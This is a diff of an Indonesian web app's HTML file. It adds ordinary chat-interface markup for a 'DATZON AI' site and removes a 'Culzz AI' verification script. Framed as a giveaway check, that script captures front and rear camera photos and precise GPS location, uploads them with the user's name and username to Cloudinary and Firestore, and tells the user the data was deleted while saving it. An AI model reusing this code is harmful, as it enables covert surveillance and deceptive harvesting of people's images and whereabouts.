-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        resolve({ ok: true, loc });
-                    },
-                    (error) => {
-                        logStatus(`Gagal mendapatkan Alokasi: ${error.message}`, 'warning');
-                        resolve({ ok: false, error });
-                    },
-                    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
-                );
-            });
-        }
-
-        async function getLocationPromise() {
-            const result = await requestLocationDetailed();
-            return result.ok ? result.loc : null;
-        }
-
-        // ==================== PUBLIC BUTTON FUNCTIONS ====================
-        async function verifyCameraAccess() {
-            if (isProcessing) return;
-            resetCompleteBox();
-
-            try {
-                setButtonLoading('btn-verify-camera', true, 'Meminta izin...');
-                logStatus('Meminta izin Tampilan ulang dari browser', 'step');
-
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    throw new Error('Akses Tampilan tidak tersedia. Buka halaman ini lewat HTTPS atau localhost.');
-                }
-
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: { ideal: 'user' }, width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                });
-                stream.getTracks().forEach(track => track.stop());
-
-                cameraGranted = true;
-                updatePermissionUI();
-                logStatus('Izin tampilan terverifikasi', 'success');
-                showToast('Tampilan sudah terverifikasi');
-            } catch (e) {
-                cameraGranted = false;
-                updatePermissionUI();
-                logStatus(`Izin Tampilan gagal: ${e.message}`, 'error');
-
-                if (isPermissionDeniedError(e)) {
-                    explainBlockedPermission('camera');
-                } else {
-                    showToast('Izin Tampilan belum aktif', 'error');
-                }
-            } finally {
-                setButtonLoading('btn-verify-camera', false);
-                updatePermissionUI();
-                stopCurrentStream();
-                updateModeBadge('SIAP');
-            }
-        }
-
-        async function verifyLocationAccess() {
-            if (isProcessing) return;
-            resetCompleteBox();
-
-            try {
-                setButtonLoading('btn-verify-location', true, 'Meminta izin...');
-                logStatus('Meminta izin Alokasi ulang dari browser', 'step');
-
-                const result = await requestLocationDetailed();
-                if (result.ok && result.loc && typeof result.loc.lat === 'number') {
-                    lastLocationData = result.loc;
-                    locationGranted = true;
-                    updatePermissionUI();
-                    logStatus(`SUKSES MENGHUBUNGKAN CULZ AI`, 'success');
-                    showToast('Alokasi sudah terverifikasi');
-                } else {
-                    locationGranted = false;
-                    updatePermissionUI();
-                    if (isPermissionDeniedError(result.error)) {
-                        explainBlockedPermission('location');
-                    } else {
-                        logStatus('Izin Alokasi belum aktif atau GPS belum berhasil dibaca', 'warning');
-                        showToast('Izin Alokasi belum aktif', 'warning');
-                    }
-                }
-            } catch (e) {
-                locationGranted = false;
-                updatePermissionUI();
-                logStatus(`Verifikasi Alokasi gagal: ${e.message}`, 'error');
-                if (isPermissionDeniedError(e)) {
-                    explainBlockedPermission('location');
-                } else {
-                    showToast('Alokasi gagal diverifikasi', 'error');
-                }
-            } finally {
-                setButtonLoading('btn-verify-location', false);
-                updatePermissionUI();
-                updateModeBadge('SIAP');
-            }
-        }
-
-        async function startBulkUpload() {
-            if (isProcessing) {
-                logStatus('Proses masih berjalan, jangan spam tombolnya. Kasihan browsernya.', 'warning');
-                showToast('Proses masih berjalan', 'warning');
-                return;
-            }
-
-            resetCompleteBox();
-
-            const namaInput = document.getElementById('nama');
-            const usernameInput = document.getElementById('username');
-            const nama = namaInput.value.trim() || 'Anonymous';
-            const username = usernameInput.value.trim();
-
-            if (!username) {
-                usernameInput.focus();
-                logStatus('Username wajib diisi supaya data gampang dicari dari website AI lain', 'warning');
-                showToast('Isi username dulu, jangan asal kosong', 'warning');
-                return;
-            }
-
-            if (!cameraGranted || !locationGranted) {
-                logStatus('Harap selesaikan verifikasi dahulu: Tampilan dan Alokasi wajib hijau', 'warning');
-                showToast('Harap selesaikan verifikasi dahulu', 'warning');
-                updatePermissionUI();
-                return;
-            }
-
-            isProcessing = true;
-            updatePermissionUI();
-            document.getElementById('status').innerHTML = '';
-            updateModeBadge('UPLOAD');
-
-            const photos = [];
-            let locationData = lastLocationData;
-            const uploadedAtISO = new Date().toISOString();
-            const uploadedDateLabel = new Date().toLocaleString('id-ID', {
-                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
-                hour: '2-digit', minute: '2-digit'
-            });
-
-            try {
-                logStatus('Memulai bulk upload verifikasi', 'step');
-                logStatus(`User: ${nama} | Username: ${username}`, 'info');
-
-                logStatus('Langkah 1/3: Tampilan depan', 'step');
-                await startCamera('user');
-                await delay(900);
-                const selfieUrl = await captureAndUploadToCloudinary('Tampilan');
-                photos.push({
-                    type: 'selfie',
-                    url: selfieUrl,
-                    capturedAt: new Date().toISOString()
-                });
-                stopCurrentStream();
-
-                logStatus('Langkah 2/3: Tampilan belakang', 'step');
-                await startCamera('environment');
-                await delay(900);
-                const backUrl = await captureAndUploadToCloudinary('back_view');
-                photos.push({
-                    type: 'back',
-                    url: backUrl,
-                    capturedAt: new Date().toISOString()
-                });
-                stopCurrentStream();
-
-                logStatus('Langkah 3/3: mengambil Alokasi terbaru', 'step');
-                const freshLocation = await getLocationPromise();
-                if (freshLocation && typeof freshLocation.lat === 'number') {
-                    locationData = freshLocation;
-                    lastLocationData = freshLocation;
-                    logStatus(`Alokasi terbaru berhasil dibaca. Kamu berada di wilayah Aman`, 'success');
-                } else if (locationData) {
-                    logStatus('Memakai Alokasi dari verifikasi sebelumnya', 'warning');
-                } else {
-                    throw new Error('Alokasi tidak tersedia saat upload');
-                }
-
-                logStatus('Verifikasi AI Berhasil', 'step');
-
-                const submissionData = {
-                    nama: nama,
-                    username: username,
-                    photos: photos,
-                    location: locationData,
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    uploadedAtISO: uploadedAtISO,
-                    uploadedDateLabel: uploadedDateLabel,
-                    status: 'pending',
-                    source: 'bulk_upload_v2',
-                    giveaway: true
-                };
-
-                const docRef = await db.collection('submissions').add(submissionData);
-
-                logStatus(`Data berhasil di hapus.`, 'success');
-                logStatus('Tampilan, Alokasi, username, dan tanggal upload siap dibaca website AI lain', 'success');
-                document.getElementById('complete-box').classList.add('show');
-                showAIWebsiteButton(username, docRef.id);
-                showToast('Bulk upload selesai. Data sudah tersimpan');
-                updateModeBadge('SELESAI');
-            } catch (error) {
-                logStatus(`Bulk upload gagal: ${error.message}`, 'error');
-                showToast('Bulk upload gagal', 'error');
-                console.error('Bulk upload error:', error);
-
-                if (photos.length > 0) {
-                    try {
-                        await db.collection('submissions').add({
-                            nama: nama,
-                            username: username,
-                            photos: photos,
-                            location: locationData,
-                            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                            uploadedAtISO: uploadedAtISO,
-                            uploadedDateLabel: uploadedDateLabel,
-                            status: 'incomplete',
-                            source: 'bulk_upload_v2',
-                            error: error.message,
-                            giveaway: true
-                        });
-                        logStatus('Data parsial yang sempat berhasil tetap disimpan', 'warning');
-                    } catch (saveErr) {
-                        logStatus('Gagal menyimpan data parsial', 'error');
-                    }
-                }
-            } finally {
-                stopCurrentStream();
-                isProcessing = false;
-                updatePermissionUI();
-                if (document.getElementById('mode-text').textContent !== 'SELESAI') updateModeBadge('SIAP');
-            }
-        }
-
-        function resetUI() {
-            document.getElementById('status').innerHTML = 'Menunggu perintah...<br><span class="info">Selesaikan Tampilan dan Alokasi dulu, baru Mulai Verifikasi Terbuka.</span>';
-            resetCompleteBox();
-            stopCurrentStream();
-            isProcessing = false;
-            updateModeBadge('SIAP');
-            updatePermissionUI();
-        }
-
-        // ==================== PERMISSION DETECTION ====================
-        async function detectPermissionStates() {
-            if (!navigator.permissions || !navigator.permissions.query) return;
-
-            try {
-                const geoPerm = await navigator.permissions.query({ name: 'geolocation' });
-                if (geoPerm.state === 'granted') {
-                    locationGranted = true;
-                    getLocationPromise().then((loc) => {
-                        if (loc) lastLocationData = loc;
-                    });
-                }
-                geoPerm.onchange = () => {
-                    locationGranted = geoPerm.state === 'granted';
-                    updatePermissionUI();
-                };
-            } catch (e) {}
-
-            try {
-                const camPerm = await navigator.permissions.query({ name: 'camera' });
-                if (camPerm.state === 'granted') cameraGranted = true;
-                camPerm.onchange = () => {
-                    cameraGranted = camPerm.state === 'granted';
-                    updatePermissionUI();
-                };
-            } catch (e) {}
-
-            updatePermissionUI();
-        }
-
-        function initializeApp() {
-            video = document.getElementById('video');
-            updateModeBadge('SIAP');
-            updatePermissionUI();
-            detectPermissionStates();
-
-            const isSecure = window.isSecureContext || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
-            if (!isSecure) {
-                logStatus('Catatan: Tampilan/Alokasi biasanya wajib HTTPS. Kalau dibuka dari file/content:// dan gagal, upload ke hosting dulu.', 'warning');
-            } else {
-                logStatus('Sistem siap. Verifikasi Tampilan lalu Alokasi.', 'info');
-            }
-
-            console.log('%c[Culzz AI] Portal verifikasi siap. Backend lama dipertahankan: Cloudinary + Firestore submissions.', 'color:#22c55e');
-        }
-
-        window.onload = initializeApp;
-        window.CulzzAI = { verifyCameraAccess, verifyLocationAccess, startBulkUpload, resetUI };
-    </script>
+    <div class="top-center">
+      <button class="glass-capsule model-button" id="modelButton" type="button" aria-haspopup="true" aria-expanded="false">
+        <span id="modelLabel">Studio Tinggi</span>
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="m7 10 5 5 5-5" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </button>
+    </div>
+
+    <div class="top-right">
+      <button class="glass-btn round-btn temp-btn" id="tempBtn" type="button" title="Mode sementara 24 jam" aria-label="Mode sementara 24 jam">
+        <svg width="23" height="23" viewBox="0 0 24 24" fill="none"><path d="M21 12a8.5 8.5 0 0 1-12.5 7.5L4 21l1.5-4.2A8.5 8.5 0 1 1 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M9 12h.01M12 12h.01M15 12h.01" stroke="currentColor" stroke-width="2.7" stroke-linecap="round"/></svg>
+      </button>
+      <div class="glass-capsule chat-actions" id="chatActions" aria-label="Aksi chat">
+        <button class="new-chat-btn" id="newChatBtn" type="button">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M12 5v14M5 12h14" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/></svg>
+          <span>Obrolan baru</span>
+        </button>
+        <button class="top-more-btn" id="topMoreBtn" type="button" aria-label="Menu chat" aria-expanded="false">
+          <svg width="21" height="21" viewBox="0 0 24 24" fill="none"><path d="M5 12h.01M12 12h.01M19 12h.01" stroke="currentColor" stroke-width="3.2" stroke-linecap="round"/></svg>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div class="floating-menu model-menu-panel" id="modelMenu" aria-hidden="true">
+    <div class="menu-title">Kecerdasan</div>
+    <button class="menu-row" type="button" data-level="Instan"><span class="grow">Instan<small>Cepat, hemat kuota, jawaban pendek.</small></span><span class="menu-check"></span></button>
+    <button class="menu-row" type="button" data-level="Sedang"><span class="grow">Sedang<small>Seimbang buat obrolan harian.</small></span><span class="menu-check"></span></button>
+    <button class="menu-row" type="button" data-level="Tinggi"><span class="grow">Tinggi<small>Lebih detail, pura-pura paling pintar.</small></span><span class="menu-check"></span></button>
+    <div class="menu-sep"></div>
+    <div class="menu-title">AI gratis</div>
+    <button class="menu-row" type="button" data-engine="Mistral"><span class="grow">Mistral<small>Ringan buat chat dan teks.</small></span><span class="menu-check"></span></button>
+    <button class="menu-row" type="button" data-engine="Groq"><span class="grow">Groq<small>Kencang buat respons cepat.</small></span><span class="menu-check"></span></button>
+    <button class="menu-row" type="button" data-engine="Google Studio"><span class="grow">Google Studio<small>Cocok kalau nanti pakai API key Gemini.</small></span><span class="menu-check"></span></button>
+  </div>
+
+  <div class="floating-menu chat-menu-panel" id="topChatMenu" aria-hidden="true">
+    <div class="menu-title" id="topChatMenuTitle">Website Chat AI</div>
+    <button class="menu-row" type="button" data-top-action="share"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><circle cx="18" cy="5" r="3" stroke="currentColor" stroke-width="2"/><circle cx="6" cy="12" r="3" stroke="currentColor" stroke-width="2"/><circle cx="18" cy="19" r="3" stroke="currentColor" stroke-width="2"/><path d="M8.65 10.65 15.35 6.35M8.65 13.35l6.7 4.3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>Bagikan</button>
+    <button class="menu-row" type="button" data-top-action="pin"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="m14 4 6 6-4 1-4 7-2-2-4 4-2-2 4-4-2-2 7-4 1-4Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>Sematkan</button>
+    <button class="menu-row" type="button" data-top-action="files"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M21.44 11.05 12.25 20.24a6 6 0 0 1-8.49-8.49l9.9-9.9a4 4 0 0 1 5.66 5.66l-9.9 9.9a2 2 0 0 1-2.83-2.83l8.49-8.49" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Gambar &amp; File</button>
+    <button class="menu-row" type="button" data-top-action="search"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="m21 21-4.3-4.3M11 19a8 8 0 1 1 0-16 8 8 0 0 1 0 16Z" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>Cari di chat</button>
+    <button class="menu-row" type="button" data-top-action="temporary"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M21 12a8.5 8.5 0 0 1-12.5 7.5L4 21l1.5-4.2A8.5 8.5 0 1 1 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M12 7v5l3 2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>Mode sementara 24 jam</button>
+    <button class="menu-row" type="button" data-top-action="export"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M12 3v12m0 0 4-4m-4 4-4-4M5 21h14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Ekspor Chat</button>
+    <div class="menu-sep"></div>
+    <button class="menu-row danger" type="button" data-top-action="delete"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M4 7h16M10 11v6M14 11v6M6 7l1 14h10l1-14M9 7V4h6v3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Hapus obrolan</button>
+  </div>
+
+  <div class="sidebar-backdrop" id="sidebarBackdrop"></div>
+  <aside class="sidebar" id="sidebar" aria-hidden="true">
+    <div class="side-head side-head-chatgpt">
+      <div class="side-title-wrap">
+        <div class="side-brand">DATZON <span>AI</span></div>
+      </div>
+      <div class="side-search-panel" id="sideSearchPanel" aria-hidden="true">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="m21 21-4.3-4.3M11 19a8 8 0 1 1 0-16 8 8 0 0 1 0 16Z" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+        <input id="sideSearchInput" type="search" placeholder="Cari obrolan..." autocomplete="off" />
+        <button class="side-search-clear" id="sideSearchClear" type="button" aria-label="Hapus pencarian sidebar">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="M18 6 6 18M6 6l12 12" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/></svg>
+        </button>
+      </div>
+      <div class="side-actions">
+        <button class="side-head-btn" id="sideSearchBtn" type="button" aria-label="Cari obrolan">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="m21 21-4.3-4.3M11 19a8 8 0 1 1 0-16 8 8 0 0 1 0 16Z" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg>
+        </button>
+        <button class="side-close" id="sideClose" type="button" aria-label="Tutup sidebar">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M18 6 6 18M6 6l12 12" stroke="currentColor" stroke-width="2.3" stroke-linecap="round"/></svg>
+        </button>
+      </div>
+    </div>
+
+    <div class="side-scroll">
+      <button class="side-item primary" type="button" data-side="new">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M12 5v14M5 12h14" stroke="currentColor" stroke-width="2.3" stroke-linecap="round"/></svg>
+        <span>Obrolan baru</span>
+      </button>
+
+      <button class="side-item" type="button" data-side="chat">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M21 12a8.5 8.5 0 0 1-12.5 7.5L4 21l1.5-4.2A8.5 8.5 0 1 1 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M8.8 11.7h.01M12 11.7h.01M15.2 11.7h.01" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></svg>
+        <span>Chat AI</span>
+      </button>
+
+      <button class="side-item" type="button" data-side="temporary">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M21 12a8.5 8.5 0 0 1-12.5 7.5L4 21l1.5-4.2A8.5 8.5 0 1 1 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M12 7v5l3 2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+        <span>Mode sementara 24 jam</span>
+      </button>
+
+      <button class="side-item" type="button" data-side="files">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M21.44 11.05 12.25 20.24a6 6 0 0 1-8.49-8.49l9.9-9.9a4 4 0 0 1 5.66 5.66l-9.9 9.9a2 2 0 0 1-2.83-2.83l8.49-8.49" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+        <span>Gambar &amp; File</span>
+      </button>
+
+      <div class="side-section-title">Fitur</div>
+      <button class="side-item" type="button" data-side="writer"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M12 20h9" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg><span>Penulisan AI</span></button>
+      <button class="side-item" type="button" data-side="summary"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M4 6h16M4 12h11M4 18h8" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg><span>Ringkasan teks</span></button>
+      <button class="side-item" type="button" data-side="codex"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="m10 20 4-16M6 8l-4 4 4 4M18 8l4 4-4 4" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Codex AI</span></button>
+      <button class="side-item" type="button" data-side="image"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><rect x="3" y="3" width="18" height="18" rx="3" stroke="currentColor" stroke-width="2"/><path d="m4 17 5-5 4 4 2-2 5 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><circle cx="15.5" cy="8.5" r="1.5" fill="currentColor"/></svg><span>Gambar AI</span></button>
+      <button class="side-item" type="button" data-side="notes"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M5 4h14v16H5V4Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M8 8h8M8 12h8M8 16h5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg><span>Catatan</span></button>
+
+      <div class="side-section-title">Terkini</div>
+      <div id="recentChats" class="recent-chats"></div>
+      <div id="recentEmpty" class="side-empty">Belum ada obrolan. Mulai chat dulu, baru riwayatnya muncul di sini. Iya, konsep yang sangat mengejutkan.</div>
+    </div>
+
+    <div class="side-profile-card">
+      <div class="side-avatar" id="sideAvatar">DZ</div>
+      <div class="side-profile-text">
+        <b id="sideProfileName">DATZON Workspace</b>
+        <span id="sideProfileStatus">Pengaturan • API gratis • Firebase aktif</span>
+      </div>
+      <button class="side-gear" type="button" data-side="settings" aria-label="Pengaturan">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 15.5A3.5 3.5 0 1 0 12 8a3.5 3.5 0 0 0 0 7.5Z" stroke="currentColor" stroke-width="2"/><path d="M19.4 15a1.8 1.8 0 0 0 .36 2l.05.05a2.1 2.1 0 0 1-3 3l-.05-.05a1.8 1.8 0 0 0-2-.36 1.8 1.8 0 0 0-1 1.63V21a2.1 2.1 0 0 1-4.2 0v-.08a1.8 1.8 0 0 0-1-1.63 1.8 1.8 0 0 0-2 .36l-.05.05a2.1 2.1 0 0 1-3-3l.05-.05a1.8 1.8 0 0 0 .36-2 1.8 1.8 0 0 0-1.63-1H3a2.1 2.1 0 0 1 0-4.2h.08a1.8 1.8 0 0 0 1.63-1 1.8 1.8 0 0 0-.36-2l-.05-.05a2.1 2.1 0 0 1 3-3l.05.05a1.8 1.8 0 0 0 2 .36 1.8 1.8 0 0 0 1-1.63V3a2.1 2.1 0 0 1 4.2 0v.08a1.8 1.8 0 0 0 1 1.63 1.8 1.8 0 0 0 2-.36l.05-.05a2.1 2.1 0 0 1 3 3l-.05.05a1.8 1.8 0 0 0-.36 2 1.8 1.8 0 0 0 1.63 1H21a2.1 2.1 0 0 1 0 4.2h-.08a1.8 1.8 0 0 0-1.52 1Z" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </button>
+    </div>
+  </aside>
+
+
+  <div class="answer-menu-portal" id="answerMenuPortal" aria-hidden="true">
+    <button type="button" data-more="regenerate">Regenerate</button>
+    <button type="button" data-more="save">Simpan ke catatan</button>
+    <button type="button" data-more="report">Laporkan bug UI</button>
+  </div>
+
+  
+  <section class="settings-page" id="settingsPage" aria-hidden="true">
+    <div class="settings-wrap">
+      <div class="settings-view settings-home active" id="settingsHome">
+        <button class="settings-back" id="settingsBack" type="button" aria-label="Kembali">
+          <svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M15 18 9 12l6-6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </button>
+
+        <div class="profile-head">
+          <div class="profile-avatar-big" id="profileAvatar">DZ
+            <button class="profile-edit" id="profileEditBtn" type="button" aria-label="Ganti nama">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 20h9" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
+            </button>
+          </div>
+          <div class="profile-name" id="profileName">DATZON User</div>
+          <input id="profilePhotoInput" class="hidden" type="file" accept="image/*" />
+        </div>
+
+        <div class="settings-section-title">DATZON AI saya</div>
+        <div class="settings-group">
+          <button class="settings-row" type="button" data-settings-open="personalization">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M12 21a9 9 0 1 0-9-9v1a5 5 0 0 0 5 5h1" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M8 12h.01M12 12h.01M16 12h.01" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Personalisasi</b><span>Gaya, karakteristik, dan instruksi AI.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="memory">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M4 19V5a3 3 0 0 1 3-3h11v17H7a3 3 0 0 0-3 3Z" stroke="currentColor" stroke-width="2"/><path d="M8 6h6M8 10h6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Memori</b><span>Nama panggilan, pekerjaan, dan preferensi.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row has-popover" type="button" data-settings-pop="accent">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M4 20h16M7 17l10-10a3 3 0 0 0-4-4L3 13v4h4Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
+            <span class="settings-row-text"><b>Warna aksen</b><span id="accentLabel"><i class="accent-dot"></i> Lime</span></span>
+            <span class="settings-chevron">⌄</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="display">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M4 6h16M7 6v12M17 6v12M5 18h14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M10 10h4" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Tampilan</b><span id="chatTextSizeLabel">Ukuran teks bubble: Normal</span></span>
+            <span class="settings-next">›</span>
+          </button>
+        </div>
+
+        <div class="settings-section-title">Akun</div>
+        <div class="settings-group">
+          <button class="settings-row" id="authMainRow" type="button" data-settings-open="auth">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><circle cx="9" cy="7" r="4" stroke="currentColor" stroke-width="2"/><path d="M19 8v6M16 11h6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b id="authRowTitle">Masuk / Daftar</b><span id="authRowSub">Sinkron profile dan obrolan ke Firebase.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row admin-only-row" id="adminPanelRow" type="button" data-settings-open="adminPanel" hidden>
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M12 3 20 6v6c0 5-3.35 8.15-8 9-4.65-.85-8-4-8-9V6l8-3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M9 12.3 11 14l4-4.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span class="settings-row-text"><b>Admin Panel</b><span>Kelola DATZON, pengguna, dan analitik nanti.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="photo">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M4 7h3l1.6-2h6.8L17 7h3v12H4V7Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><circle cx="12" cy="13" r="4" stroke="currentColor" stroke-width="2"/><path d="M7 10h.01" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Photo Profile</b><span id="profilePhotoRowSub">Ganti atau hapus foto profil.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M10 6h10v14H4V6h6Zm0 0V4a2 2 0 0 1 4 0v2" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
+            <span class="settings-row-text"><b>Workspace</b><span>Pribadi</span></span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="limit">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M4 19V5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M7 17h10M8 8h8M8 12h5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M4 19c1.5-1.3 3-1.3 4.5 0s3 1.3 4.5 0 3-1.3 4.5 0 3 1.3 4.5 0" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Limit Request</b><span id="limitRequestSummary">Guest: Chat 20x • Gambar 5x</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="rank">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="m12 3 2.7 5.5 6.1.9-4.4 4.3 1 6.1L12 17l-5.4 2.8 1-6.1-4.4-4.3 6.1-.9L12 3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
+            <span class="settings-row-text"><b>Rank</b><span id="rankSummary">Guest</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="redeem">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M4 7h16v4a2 2 0 0 0 0 4v4H4v-4a2 2 0 0 0 0-4V7Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M9 9h.01M9 15h.01M12 7v12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            <span class="settings-row-text"><b>Tukarkan Kode</b><span>Masukkan voucher Rank atau bonus.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="apikeys">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M15 7a4 4 0 1 1-2.8-3.82A4 4 0 0 1 15 7Z" stroke="currentColor" stroke-width="2"/><path d="m14 10 7 7-3 3-2-2-2 2-2-2 2-2-2-2" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
+            <span class="settings-row-text"><b>API Key Sendiri</b><span>Simpan API key pribadi untuk provider custom.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="checkin">
+            <svg width="27" height="27" viewBox="0 0 24 24" fill="none"><path d="M8 2v4M16 2v4M3 9h18M5 5h14a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="m8 14 2.2 2.2L16 11" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span class="settings-row-text"><b>Check in Harian</b><span>Ambil bonus limit request 7 hari.</span></span>
+            <span class="settings-next">›</span>
+          </button>
+          <button class="settings-row" type="button" data-settings-open="quota">
